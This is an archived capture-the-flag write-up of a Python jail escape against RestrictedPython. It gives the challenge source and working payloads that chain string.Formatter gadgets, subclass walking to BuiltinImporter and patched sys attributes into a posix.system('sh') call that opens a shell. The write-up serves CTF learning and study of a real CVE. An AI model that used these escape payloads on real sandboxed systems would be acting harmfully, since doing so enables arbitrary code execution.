# Restricted

**CTF:** TheCyberJawaraInternational 2024  
**Category:** misc  
**Original writeup:** <https://gist.github.com/Lydxn/26679096f7675abc3eb30b7fbfc07541> — by **Lydxn**. All credit goes to the original author; this is an archived copy.

---

Restricted (1 solve)

Welcome to another classic PyJail. Given the level of restrictions in place, are you able to escape this time? nc 68.183.177.211 10002

Source code:

#!/usr/bin/env python3 from RestrictedPython import compile_restricted from RestrictedPython import utility_builtins from RestrictedPython import safe_globals import sys code = input ( 'Enter code: ' ) banned = '$[#<@;-}>?!&" \' ]|/^{+%~` \\ ' for char in set ( code ): if char in banned : exit ( 'Banned character detected' ) try : byte_code = compile_restricted ( code , '<string>' , 'exec' ) exec_globals = { ** safe_globals , ** utility_builtins } sys . modules [ 'os' ]. __dict__ . clear () sys . modules [ 'posix' ]. __dict__ . clear () sys . modules . clear () for _ in sys . __dict__ : sys . __dict__ [ _ ] = None del sys exec ( byte_code , exec_globals , {}) except : pass

This challenge was essentially a revamp of respy nice challenge from jailCTF 2024. The key changes were:

Only the string module is allowed, random has been removed.

module is allowed, has been removed. A charcater blacklist specified by the banned variable.

variable. sys is completely cleared, as well as the os/posix namespaces.

The payload to the original challenge looked like this:

random . seed ( 13371337 ) try : random . Random . randbytes ( string , 1 ) except AttributeError as e : x = random . choice ( e . obj . Formatter (). get_field ( "..." , [ e . obj ], {}))( 'sh' )

but due to the above restrictions, we have to be a little more clever. After some hours of trying different things, I came up with the following payload:

try : string . capwords ( 0 , string ) except AttributeError as e : string = e . obj e = string . digits * 0 p = string . printable d = string . digits * 2 p = p . replace ( e , d ). split ( d ) FMTSTR = { FMTSTR } PAYLOAD = { PAYLOAD } F = string . Formatter (). get_field ( FMTSTR , ( string ,), 0 ) E = string . Formatter (). get_value ( 0 , F , 0 ) E ( PAYLOAD )

where {FMTSTR} and {PAYLOAD} are replaced with some Python expression that generates arbitrary strnigs using e and p . More specifically, the code can be generated via this function:

def lol ( s ): table = [ '' , * string . printable , '' ] return 'e.join((' + ',' . join ( f'p.copy().pop( { table . index ( c ) } )' for c in s ) + '))'

The PAYLOAD part will then be executed in an exec() without the restrictions imposed by RestrictedPython. However, that is the only half the battle. We also must get around the removal of sys , which turned out to cause more of a headache than I anticipated. Several areas of the import functionality depend on sys , which meant that an error would occur whenever we try loading a module. Fortunately, I was able to resolve the issue by assinging a few "fake" values to some of the sys attributes until Python stopped complaining:

S = (). __class__ . __base__ . __subclasses__ () type = S [ 0 ] BuiltinImporter = [ x for x in S if x . __name__ == 'BuiltinImporter' ][ 0 ] sys = BuiltinImporter . find_spec . __globals__ [ 'sys' ] sys . builtin_module_names = [ 'posix' ] sys . modules = {} sys . flags = type ( 'C' , (), { 'verbose' : 0 }) BuiltinImporter . load_module ( 'posix' ). system ( 'sh' )

In particular, I needed to "restore" builtin_module_names , modules , and flags in order to call BuiltinImporter.load_module() successfully. From this, I was able to open a shell and read out the flag!

Flag: CJ{its_y0ur_cl4asic_pyj4il_plus_CVE-2024-47532_283570c6bd}
